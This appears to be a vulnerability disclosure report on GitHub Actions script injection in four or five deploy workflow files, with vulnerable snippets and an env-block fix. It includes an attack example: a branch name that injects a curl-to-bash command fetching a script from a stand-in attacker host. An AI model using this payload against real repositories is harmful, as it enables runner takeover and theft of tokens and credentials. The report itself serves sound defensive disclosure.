Confirmed Vulnerabilities

All 5 findings were manually verified against the live repository before disclosure. No finding was published based solely on automated output.

CRITICAL
GHA_SCRIPT_INJECTION
.github/workflows/deploy-DEV-linters.yml · line 42

The PR title is interpolated directly into a run: shell step. An attacker opens a PR with a title containing shell metacharacters to execute arbitrary commands on the runner.

# Vulnerable — pr.title is attacker-controlled
echo "title=${{ github.event.pull_request.title }}" >> $GITHUB_OUTPUT
Vector github.event.pull_request.title
CRITICAL × 4
GHA_SCRIPT_INJECTION
4 workflow files · identical pattern

The branch name (github.head_ref) from a forked PR is interpolated into a shell variable assignment. Surrounding quotes do not prevent injection — GitHub Actions interpolates the expression before the shell parses the line.

# Vulnerable — head_ref is attacker-controlled (fork branch name)
GITHUB_BRANCH=$([ "${{ github.event_name }}" == "pull_request" ] \
  && echo "${{ github.head_ref }}" \
  || echo "${{ github.ref_name }}")
deploy-DEV-linters.yml · line 182
deploy-DEV.yml · line 170
deploy-RELEASE-linters.yml · line 161
deploy-BETA-linters.yml · line 177
Vector github.head_ref — fork branch name, fully attacker-controlled

Attack vector example

Create a fork, name the branch as shown below, open a pull request — the workflow executes the injected command on the GitHub Actions runner:

feature/x"; curl -s https://attacker.com/shell.sh | bash; echo "

Potential impact: exfiltration of GITHUB_TOKEN, registry credentials, build artefact tampering, lateral movement to connected services.

Recommended Fix

Pass all untrusted GitHub contexts through an env: block. Shell variable references ($VAR) are never subject to expression injection.

# Safe — untrusted data bound to env vars, never interpolated into run:
- name: Get PR title or commit message
  id: get-title
  env:
    PR_TITLE: ${{ github.event.pull_request.title }}
    HEAD_REF: ${{ github.head_ref }}
    REF_NAME: ${{ github.ref_name }}
    EVENT_NAME: ${{ github.event_name }}
  run: |
    echo "title=${PR_TITLE}" >> $GITHUB_OUTPUT
    GITHUB_BRANCH=$([ "$EVENT_NAME" == "pull_request" ] \
      && echo "$HEAD_REF" || echo "$REF_NAME")
